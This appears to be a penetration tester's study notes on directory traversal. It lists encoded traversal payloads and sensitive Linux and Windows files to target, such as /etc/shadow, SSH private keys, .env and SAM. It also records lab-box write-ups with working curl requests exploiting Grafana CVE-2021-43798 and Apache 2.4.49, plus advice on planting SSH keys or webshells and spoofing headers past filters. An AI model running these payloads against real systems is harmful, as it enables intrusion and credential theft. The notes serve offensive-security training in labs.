# Directory Traversal (Path Traversal)

See also: [[LFI-RFI]], [[Web-Methodology]]

Closely related to [[LFI-RFI]] — traversal reads files, LFI includes/executes them.

## Basic Payloads

```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd   (double URL encode)
....//....//....//etc/passwd      (strips ../ once — bypass)
..../..../..../etc/passwd
```

## Windows Payloads

```
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows\system32\drivers\etc\hosts
```

## Interesting Files — Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/home/user/.bash_history
/proc/self/environ
/proc/self/cmdline
/var/www/html/config.php
/var/www/html/.env
/opt/application/config.yml
```

## Interesting Files — Windows

```
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM        (usually locked)
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\Desktop\proof.txt
C:\Users\user\Desktop\local.txt
C:\xampp\apache\conf\httpd.conf
C:\xampp\htdocs\config.php
```

## Tips

- Increase `../` depth (try 10+ levels) — extra `../` past root is harmless
- Try both forward slash and backslash on Windows targets
- If app appends extension (`.php`), try null byte `%00` (old PHP) or path truncation
- Encode dots and slashes if basic traversal is filtered

## From Your Boxes

> **Tabby** (HTB) — PHP `file=` parameter LFI to leak Tomcat credentials
> - What worked: `http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml`
> - Lesson: LFI to read config files (tomcat-users.xml, wp-config.php) is often more valuable than /etc/passwd

> **Poison** (HTB) — PHP `file=` parameter LFI chained with log poisoning for RCE
> - What worked: `http://TARGET/browse.php?file=../../../../../../../etc/passwd`
> - Chained with log poisoning after reading httpd.conf to find log paths
> - Lesson: After confirming LFI, locate log files via config reads and escalate to RCE via log poisoning

> **ServMon** (HTB) — NVMS 1000 directory traversal to grab passwords file from user desktop
> - What worked: `GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt` (via Burp, not browser)
> - Lesson: Browser may normalize traversal paths — always test in Burp. Target known file locations from recon

> **Fantastic** (PG) — Grafana CVE-2021-43798 path traversal to steal grafana.db
> - What worked: `curl --path-as-is http://TARGET:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`
> - Lesson: `--path-as-is` with curl prevents path normalization. Grafana DB contains encrypted creds that can be decrypted

> **Boolean** (PG) — File manager `cwd=` parameter traversal for both read AND write
> - What worked: `http://TARGET/?cwd=/../../../../../etc&file=passwd&download=true`
> - Also used traversal to upload SSH authorized_keys to user's .ssh directory
> - Lesson: If traversal works for reads, test writes too — upload SSH keys or webshells

> **XposedAPI** (PG) — API `file=` parameter traversal bypassed with X-Forwarded-For header
> - What worked: `GET /logs?file=../../../etc/passwd` with `X-Forwarded-For: 127.0.0.1` header
> - Lesson: Internal-only APIs may trust X-Forwarded-For — try localhost spoofing headers to bypass WAF

> **Clue** (PG) — Grafana + FreeSWITCH chained traversal to steal SSH keys
> - What worked: `curl --path-as-is 127.0.0.1:4444/../../../../../../../../home/anthony/.ssh/id_rsa`
> - Lesson: After getting a foothold, check internal services for traversal too — not just external

> **DVR4** (PG/Windows) — Argus Surveillance DVR 4.0 traversal to steal Windows SSH keys
> - What worked: `curl "http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1"`
> - Lesson: Windows traversal works the same — target `C:\Users\USERNAME\.ssh\id_rsa` or SAM/SYSTEM hives

> **BackupAdminV2** (VHL) — PHP File Vault 0.9 traversal to leak nginx htpasswd
> - What worked: `http://TARGET/fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fhtpasswd`
> - Lesson: Target service-specific credential files (htpasswd, .htaccess, wp-config.php) not just /etc/passwd

> **Relia** (Course) — Apache 2.4.49 CVE path traversal with URL-encoded dots
> - What worked: `curl --path-as-is "192.168.x.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`
> - Lesson: Apache 2.4.49/2.4.50 path traversal uses `.%2e` encoding to bypass normalization
